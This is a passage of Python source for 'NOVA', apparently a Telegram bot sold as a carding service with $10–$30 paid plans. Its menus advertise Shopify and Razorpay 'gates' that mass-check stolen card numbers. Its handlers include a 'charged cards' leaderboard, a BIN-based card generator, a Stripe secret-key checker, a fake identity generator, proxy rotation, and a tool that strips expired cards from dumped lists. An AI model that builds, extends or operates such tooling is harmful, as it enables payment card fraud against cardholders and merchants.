    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to .txt')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to .txt')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    now = datetime.now()
    kept, removed = [], 0
    for c in cards:
        parts = c.split('|')
        if len(parts) != 4:
            removed += 1; continue
        try:
            y = int(parts[2]); m = int(parts[1])
        except ValueError:
            removed += 1; continue
        if y < now.year or (y == now.year and m < now.month):
            removed += 1
        else:
            kept.append(c)
    if not kept:
        return await styled_reply(event, pe(f"💎 <b>{bs('All expired')}</b>"))
    fname = f"NOVA_cleaned_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for c in kept:
            await f.write(c + "\n")
    await client_instance.send_file(uid, fname,
        caption=pe(f"✅ {bs('Kept')} <code>{len(kept)}</code> · {bs('Removed')} <code>{removed}</code>"),
        parse_mode='html')
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]rank$'))
async def cmd_rank(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    rank = load_rank()
    if not rank:
        return await styled_reply(event, pe(f"💎 {bs('No charged cards yet')}"))
    top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
    lines = []
    for i, (uid_str, count) in enumerate(top, 1):
        try:
            ent = await client_instance.get_entity(int(uid_str))
            name = ent.first_name or uid_str
        except Exception:
            name = uid_str
        lines.append(f"{i}. <b>{name}</b> — <code>{count}</code>")
    await styled_reply(event, pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines)))


# ====================== ADMIN MISC ======================
@client.on(events.NewMessage(pattern=r'^[/.]ping$'))
async def cmd_ping(event):
    t = time.time()
    m = await styled_reply(event, pe("🏓 ..."))
    if m:
        try:
            await m.edit(pe(f"🏓 <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>"), parse_mode='html')
        except Exception:
            pass


@client.on(events.NewMessage(pattern=r'^[/.]toggle$'))
async def cmd_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return
    cur = get_maintenance()
    set_maintenance(not cur)
    await styled_reply(event, pe(f"💎 {bs('Maintenance')}: {'ON' if not cur else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]stats$'))
async def cmd_stats(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    rank = load_rank()
    total_charged = sum(int(v) for v in rank.values()) if rank else 0
    await styled_reply(event, pe(
        f"📊 <b>{bs('Stats')}</b>\n{SEP}\n"
        f"👑 Admins: <code>{len(ADMIN_ID)}</code>\n"
        f"💎 Premium: <code>{len(data)}</code>\n"
        f"🌐 Sites: <code>{len(load_sites())}</code>\n"
        f"🔑 Keys: <code>{len(load_keys())}</code>\n"
        f"💳 Total charged: <code>{total_charged}</code>\n"
        f"🤖 Maintenance: {'ON' if get_maintenance() else 'OFF'}"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]all\s+'))
async def cmd_all(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/all message</code>"))
    msg = parts[1]
    data = load_premium_users()
    sent = 0
    for uid_str in data.keys():
        try:
            await client_instance.send_message(int(uid_str), pe(msg), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await styled_reply(event, pe(f"✅ {bs('Sent to')} <code>{sent}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]fb$'))
async def cmd_fb(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID:
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to media')}"))
    reply = await event.get_reply_message()
    try:
        await client_instance.forward_messages(GROUP_CHAT_ID, reply)
        await styled_reply(event, pe(f"✅ {bs('Forwarded')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addadmin\s+'))
async def cmd_addadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/addadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already admin')}</b>"))
    ADMIN_ID.append(t)
    await styled_reply(event, pe(f"✅ <b>{bs('Admin added')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removeadmin\s+'))
async def cmd_removeadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removeadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t not in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not an admin')}</b>"))
    ADMIN_ID.remove(t)
    await styled_reply(event, pe(f"✅ <b>{bs('Admin removed')}</b> <code>{t}</code>"))


# ====================== VIDEO ======================
@client.on(events.NewMessage(pattern=r'^[/.]setwelcomevideo$'))
async def cmd_setwelcomevideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    path = os.path.join(VIDEO_DIR, "welcome.mp4")
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Welcome video set')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addhitvideo$'))
async def cmd_addhitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    fname = f"hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    path = os.path.join(VIDEO_DIR, fname)
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Added')} <code>{fname}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listhitvideos$'))
async def cmd_listhitvideos(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    lines = [f"{i}. <code>{os.path.basename(v)}</code>" for i, v in enumerate(vids, 1)]
    await styled_reply(event, pe(f"🎬 <b>{bs('Hit videos')}</b> ({len(vids)})\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]removehitvideo\s+'))
async def cmd_removehitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removehitvideo 1</code>"))
    try:
        idx = int(parts[1]) - 1
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid')}</b>"))
    vids = get_hit_videos()
    if idx < 0 or idx >= len(vids):
        return await styled_reply(event, pe(f"💎 <b>{bs('Out of range')}</b>"))
    try:
        os.remove(vids[idx])
        await styled_reply(event, pe(f"✅ {bs('Removed')} <code>{os.path.basename(vids[idx])}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]hitvideo$'))
async def cmd_hitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    try:
        await client_instance.send_file(event.chat_id, random.choice(vids),
            caption=pe(f"🎬 {bs('Sample')}"), parse_mode='html')
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== /start + /cmds ======================
def main_menu_buttons(uid=None):
    buttons = [
        [pbtn(bs("Gates"), data="gates_menu", style="success", icon="🔓"),
         pbtn(bs("Proxy Setup"), data="proxy_menu", style="primary", icon="🔌")],
        [pbtn(bs("Tools"), data="tools_menu", style="primary", icon="🛠️"),
         pbtn(bs("Plans"), data="plans_pricing", style="success", icon="💎")],
        [Button.url(bs("Support"), f"https://t.me/{OWNER_TAG.lstrip('@')}"),
         pbtn(bs("Close"), data="close_menu", style="danger", icon="❌")],
    ]
    if uid and uid in ADMIN_ID:
        buttons.append([pbtn(bs("Admin Panel"), data="admin_panel", style="success", icon="👑")])
    return buttons


@client.on(events.NewMessage(pattern=r'^[/.]start$'))
async def cmd_start(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or "User"
    except Exception:
        username = "User"
    if uid in ADMIN_ID: status_text = f"👑 {bs('Admin')}"
    elif is_premium(uid): status_text = f"💎 {bs('Premium')}"
    else: status_text = f"🆓 {bs('Free')}"
    limit_text = bs("Unlimited") if (is_premium(uid) or uid in ADMIN_ID) else "N/A cards/file"
    text = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")
    buttons = main_menu_buttons(uid)
    welcome = get_welcome_video()
    if welcome:
        try:
            await client_instance.send_file(event.chat_id, welcome,
                caption=text, buttons=buttons, parse_mode='html', supports_streaming=True)
            return
        except Exception:
            pass
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]cmds$'))
async def cmd_cmds(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    kb = [
        [pbtn(bs("🛒 Shopify Commands"), data="cmd_shopify", style="primary", icon="🛒")],
        [pbtn(bs("🔴 Razorpay Commands"), data="cmd_razorpay", style="danger", icon="🔴")],
        [pbtn(bs("🔌 Proxy Commands"),   data="cmd_proxy", style="primary", icon="🔌")],
        [pbtn(bs("🌐 Site Commands"),    data="cmd_sites", style="primary", icon="🌐")],
        [pbtn(bs("🛠️ Tools & File Commands"), data="cmd_tools", style="primary", icon="🛠️")],
        [pbtn(bs("👑 Admin Commands"),   data="cmd_admin", style="success", icon="👑")],
        [pbtn(bs("🔙 Back to Menu"),     data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, pe(f"💎 {bs('Select a category to see all commands with usage:')}"), buttons=kb)


@client.on(events.CallbackQuery(data=b"cmd_shopify"))
async def cb_cmd_shopify(event):
    await event.answer()
    text = pe(f"""🛒 <b>{bs('Shopify Gate Commands')}</b>
{SEP}
<code>/sh card|mm|yy|cvv</code> ━ {bs('Single card check')}
<code>/msh</code> ━ {bs('Mass check (reply to .txt file) – uses sites.txt')}
{SEP}
💡 <i>{bs('Requires sites + proxies')}</i>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_razorpay"))
async def cb_cmd_razorpay(event):
    await event.answer()
    text = pe(f"""🔴 <b>{bs('Razorpay Gate Commands')}</b>
{SEP}
<code>/rz card|mm|yy|cvv</code> ━ {bs('Single card check')}
<code>/mrz</code> ━ {bs('Mass check (reply to .txt file)')}
{SEP}
💡 <i>{bs('Requires proxies')}</i>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_proxy"))
async def cb_cmd_proxy(event):
    await event.answer()
    text = pe(f"""🔌 <b>{bs('Proxy Management')}</b>
{SEP}
<code>/addproxy</code> ━ {bs('Add proxies (one per line)')}
<code>/proxy</code> ━ {bs('Check all proxies (removes dead)')}
<code>/chkproxy</code> ━ {bs('Check a single proxy')}
<code>/rmproxy</code> ━ {bs('Remove a specific proxy')}
<code>/rmproxyindex 1,2,3</code> ━ {bs('Remove by index')}
<code>/clearproxy</code> ━ {bs('Remove all proxies')}
<code>/myproxy</code> ━ {bs('View your proxies')}
<code>/getproxy</code> ━ {bs('Download proxy list')}
{SEP}
💡 <i>{bs('Premium only')}</i>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_sites"))
async def cb_cmd_sites(event):
    await event.answer()
    text = pe(f"""🌐 <b>{bs('Shopify Sites Management')}</b>
{SEP}
<code>/addsites</code> ━ {bs('Upload sites (.txt file)')}
<code>/site</code> ━ {bs('Check & remove dead sites')}
<code>/rm</code> ━ {bs('Remove a specific site')}
<code>/getsites</code> ━ {bs('Download current sites.txt')}
<code>/setthreshold 20</code> ━ {bs('Set price threshold')}
<code>/getthreshold</code> ━ {bs('Show current threshold')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_tools"))
async def cb_cmd_tools(event):
    await event.answer()
    text = pe(f"""🛠️ <b>{bs('Tools & File Commands')}</b>
{SEP}
<b>🔍 Tools</b>
<code>/bin 123456</code> ━ {bs('BIN lookup')}
<code>/sk sk_live_...</code> ━ {bs('Check Stripe key')}
<code>/scg https://site.com</code> ━ {bs('Site scanner')}
<code>/gen 123456 10</code> ━ {bs('Generate cards')}
<code>/fake US</code> ━ {bs('Fake data generator')}
<code>/ip 8.8.8.8</code> ━ {bs('IP lookup')}
<code>/iban GB82WEST...</code> ━ {bs('IBAN validator')}
{SEP}
<b>📁 File Tools</b>
<code>/split 1000</code> ━ {bs('Split .txt into chunks')}
<code>/merge</code> ━ {bs('Merge multiple files')}
<code>/collect</code> ━ {bs('Collect cards from messages')}
<code>/clean</code> ━ {bs('Remove expired cards')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_admin"))
async def cb_cmd_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    text = pe(f"""👑 <b>{bs('Admin Panel')}</b>
{SEP}
<b>📋 Premium Management</b>
<code>/addpremium user_id [days] [cc_limit]</code>
<code>/removepremium user_id</code>
<code>/listpremium</code>
<code>/genkeys amount hours max_users cc_limit [price]</code>
<code>/listkeys</code>
<code>/delkey NOVA_XXXX</code>
{SEP}
<b>🌐 Shopify Sites</b>
<code>/addsites</code> · <code>/site</code> · <code>/rm</code>
<code>/getsites</code>
<code>/setthreshold 10</code> · <code>/getthreshold</code>
{SEP}
<b>📊 Bot Control</b>
<code>/stats</code> · <code>/status</code> · <code>/ping</code> · <code>/toggle</code>
<code>/all message</code> · <code>/fb</code>
{SEP}
<b>🎬 Video Management</b>
<code>/setwelcomevideo</code> · <code>/addhitvideo</code>
<code>/listhitvideos</code> · <code>/removehitvideo N</code> · <code>/hitvideo</code>
{SEP}
<b>👑 Admin</b>
<code>/addadmin user_id</code>
<code>/removeadmin user_id</code>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back to Commands"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"back_cmds"))
async def cb_back_cmds(event):
    await event.answer()
    kb = [
        [pbtn(bs("🛒 Shopify Commands"), data="cmd_shopify", style="primary", icon="🛒")],
        [pbtn(bs("🔴 Razorpay Commands"), data="cmd_razorpay", style="danger", icon="🔴")],
        [pbtn(bs("🔌 Proxy Commands"),   data="cmd_proxy", style="primary", icon="🔌")],
        [pbtn(bs("🌐 Site Commands"),    data="cmd_sites", style="primary", icon="🌐")],
        [pbtn(bs("🛠️ Tools & File Commands"), data="cmd_tools", style="primary", icon="🛠️")],
        [pbtn(bs("👑 Admin Commands"),   data="cmd_admin", style="success", icon="👑")],
        [pbtn(bs("🔙 Back to Menu"),     data="main_menu", style="danger", icon="🔙")],
    ]
    await event.edit(pe(f"💎 {bs('Select a category to see all commands with usage:')}"),
                     buttons=kb, parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"main_menu"))
async def cb_main(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
    except Exception:
        username = f"user_{uid}"
    if uid in ADMIN_ID: status = "👑 Admin"
    elif is_premium(uid): status = "⭐ Premium"
    else: status = "🆓 Free"
    text = pe(f"""💎 <b>{bs('NOVA')}</b>
{SEP}
👤 @{username}
🆔 <code>{uid}</code>
📊 {status}
{SEP}
🔥 {bs('Fast · Accurate · Reliable')}
💡 {bs('Use the buttons below')}
{SEP}
{DEV_LINE}""")
    try:
        await event.edit(text, buttons=main_menu_buttons(uid), parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"gates_menu"))
async def cb_gates(event):
    await event.answer()
    text = pe(f"""📋 <b>{bs('User Commands')}</b>
{SEP}
🛒 <b>{bs('Shopify Gates')}</b>
└─ /sh card|mm|yy|cvv → {bs('Single card')}
└─ /msh → {bs('Mass check from .txt')}
{SEP}
🔴 <b>{bs('Razorpay Gates')}</b>
└─ /rz card|mm|yy|cvv → {bs('Single card')}
└─ /mrz → {bs('Mass check from .txt')}
{SEP}
🔑 <b>{bs('Key System')}</b>
└─ /redeem KEY → {bs('Redeem a premium key')}
{SEP}
📊 <b>{bs('Ranking')}</b>
└─ /rank → {bs('Top 10 charged users')}
{SEP}
📢 <b>{bs('Forward Media')}</b>
└─ /fb → {bs('Forward to group (admin)')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"tools_menu"))
async def cb_tools(event):
    await event.answer()
    text = pe(f"""🛠️ <b>{bs('Tools Menu')}</b>
{SEP}
🔍 <code>/bin BIN</code> ━ {bs('BIN info')}
🔑 <code>/sk key</code> ━ {bs('Stripe key check')}
🌐 <code>/scg URL</code> ━ {bs('Site scanner')}
💳 <code>/gen BIN [n]</code> ━ {bs('Card generator')}
👤 <code>/fake CC</code> ━ {bs('Fake identity')}
📡 <code>/ip ip</code> ━ {bs('IP lookup')}
🏦 <code>/iban IBAN</code> ━ {bs('IBAN check')}
{SEP}
📁 <code>/split N</code> · <code>/merge</code>
📁 <code>/collect</code> · <code>/clean</code>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"plans_pricing"))
async def cb_plans(event):
    await event.answer()
    text = pe(f"""<b>{PE} {bs('Plans & Pricing')}</b>

<b>{bs('Access')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 7 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $10

<b>{bs('Elite')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 15 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $15

<b>{bs('Pro')}</b> 💎
{SEP}
⏱️ <b>{bs('Span')}</b> ━ 30 {bs('Days')}
♾️ <b>{bs('Credits')}</b> ━ {bs('Unlimited')}
💰 <b>{bs('Price')}</b> ━ $30

{SEP}
💡 {bs('Contact')} <a href='https://t.me/{OWNER_TAG.lstrip("@")}'>{OWNER_TAG}</a>""")
    buttons = [
        [Button.url(bs("📩 Contact Admin"), f"https://t.me/{OWNER_TAG.lstrip('@')}")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]
    ]
    await event.edit(text, buttons=buttons, parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"close_menu"))
async def cb_close(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"admin_panel"))
async def cb_admin_panel(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    await cb_cmd_admin(event)


@client.on(events.CallbackQuery(data=b"check_joined"))
async def cb_check_joined(event):
    uid = event.sender_id
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
    else:
        await event.answer("❌ Not joined", alert=True)


# ====================== MAIN ======================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            data = load_premium_users()
            now = datetime.now().timestamp()
            changed = False
            for uid, info in list(data.items()):
                if isinstance(info, dict):
                    exp = info.get('expiry')
                    if exp and now > float(exp):
                        del data[uid]; changed = True
            if changed:
                save_premium_users(data)
        except Exception:
            pass


async def main():
    global client_instance
    client_instance = client
    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass
    log_system("BOOT", "Starting NOVA bot...")
    if not os.path.exists(PREMIUM_USERS_FILE):
        save_premium_users({str(uid): None for uid in ADMIN_ID})
    if not os.path.exists(USER_PROXIES_FILE):
        _write_json(USER_PROXIES_FILE, {})
    if not os.path.exists(KEYS_FILE):
        _write_json(KEYS_FILE, {})
    if not os.path.exists(RANK_FILE):
        _write_json(RANK_FILE, {})
    if not os.path.exists(SITES_FILE):
        open(SITES_FILE, 'a').close()
    if not os.path.exists(SETTINGS_FILE):
        save_settings({"maintenance": False, "threshold": 10.0})
    asyncio.create_task(premium_cleanup_loop())
    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA bot online.")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
